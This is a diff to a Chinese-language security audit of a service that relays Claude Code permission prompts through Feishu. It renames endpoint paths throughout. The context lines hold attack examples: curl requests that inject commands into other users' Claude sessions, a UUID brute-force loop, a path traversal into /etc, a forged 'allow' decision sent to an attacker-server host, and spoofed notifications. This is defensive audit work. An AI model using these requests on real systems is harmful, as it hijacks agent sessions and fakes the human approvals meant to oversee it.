@@ -26,9 +26,9 @@
 | `/deny` | GET | 拒绝权限请求 | 低 | 无 |
 | `/interrupt` | GET | 拒绝并中断 | 低 | 无 |
 | `/status` | GET | 查看服务状态 | 低 | 无 |
-| `/callback/decision` | POST | 纯决策接口（网关调用） | **高** | 无 |
-| `/feishu/send` | POST | 发送飞书消息 | **高** | 无 |
-| `/claude/continue` | POST | 继续 Claude 会话 | **高** | 无 |
+| `/cb/decision` | POST | 纯决策接口（网关调用） | **高** | 无 |
+| `/gw/feishu/send` | POST | 发送飞书消息 | **高** | 无 |
+| `/cb/claude/continue` | POST | 继续 Claude 会话 | **高** | 无 |
 | `/` (POST) | POST | 飞书事件回调 | 中 | ✅ Verification Token |
 
 > ***风险等级说明**：`/allow` 和 `/always` 因 request_id 已优化为 32 位随机字符，从「严重」降为「中」。实际风险取决于部署场景：
@@ -130,7 +130,7 @@ os.chmod(SOCKET_PATH, 0o666)  # 任意用户可读写
 ```python
 def _forward_to_callback_service(callback_url: str, action_type: str, request_id: str):
     # 直接信任 callback_url，无验证
-    api_url = f"{callback_url}/callback/decision"
+    api_url = f"{callback_url}/cb/decision"
     requests.post(api_url, json={...})
 ```
 
@@ -207,7 +207,7 @@ done
 ```python
 # 攻击场景 1: 注入恶意 Callback URL
 # 攻击者控制的服务返回恶意 callback_url
-POST /feishu/send HTTP/1.1
+POST /gw/feishu/send HTTP/1.1
 {
   "msg_type": "interactive",
   "content": {
@@ -227,7 +227,7 @@ POST /feishu/send HTTP/1.1
 }
 
 # 场景 2: 网关将决策转发到攻击者服务器
-POST http://attacker-server:9000/callback/decision
+POST http://attacker-server:9000/cb/decision
 {
   "action": "allow",
   "request_id": "xxx",
@@ -254,7 +254,7 @@ POST http://attacker-server:9000/callback/decision
 
 **等级**: **高**
 
-**描述**: `/claude/continue` 接口无额外验证。
+**描述**: `/cb/claude/continue` 接口无额外验证。
 
 **影响范围**: OpenAPI 模式
 
@@ -262,7 +262,7 @@ POST http://attacker-server:9000/callback/decision
 
 ```bash
 # 场景 1: 在他人会话中执行恶意命令
-curl -X POST http://target-server:8080/claude/continue \
+curl -X POST http://target-server:8080/cb/claude/continue \
   -H "Content-Type: application/json" \
   -d '{
     "session_id": "550e8400-e29b-41d4-a716-446655440000",
@@ -274,12 +274,12 @@ curl -X POST http://target-server:8080/claude/continue \
 # session_id 是 UUID v4 格式，可以暴力枚举
 for i in {1..10000}; do
   uuid=$(cat /proc/sys/kernel/random/uuid)
-  curl -X POST http://target-server:8080/claude/continue \
+  curl -X POST http://target-server:8080/cb/claude/continue \
     -d "{\"session_id\": \"$uuid\", \"prompt\": \"whoami\"}"
 done
 
 # 场景 3: 路径遍历
-curl -X POST http://target-server:8080/claude/continue \
+curl -X POST http://target-server:8080/cb/claude/continue \
   -d '{
     "session_id": "xxx",
     "project_dir": "/etc",
@@ -363,13 +363,13 @@ echo -n "$(printf '%08x' 45)$(echo '{"request_id":"xxx","decision":"allow"}' | b
 
 **等级**: **高**
 
-**描述**: `/feishu/send` 接口无鉴权，任何人可以调用。
+**描述**: `/gw/feishu/send` 接口无鉴权，任何人可以调用。
 
 #### 攻击示例
 
 ```bash
 # 场景 1: 滥用发送接口，消耗配额
-curl -X POST http://target-server:8080/feishu/send \
+curl -X POST http://target-server:8080/gw/feishu/send \
   -H "Content-Type: application/json" \
   -d '{
     "receive_id": "ou_xxx",
@@ -379,7 +379,7 @@ curl -X POST http://target-server:8080/feishu/send \
   }'
 
 # 场景 2: 伪造官方通知
-curl -X POST http://target-server:8080/feishu/send \
+curl -X POST http://target-server:8080/gw/feishu/send \
   -d '{
     "receive_id": "ou_victim",
     "msg_type": "interactive",
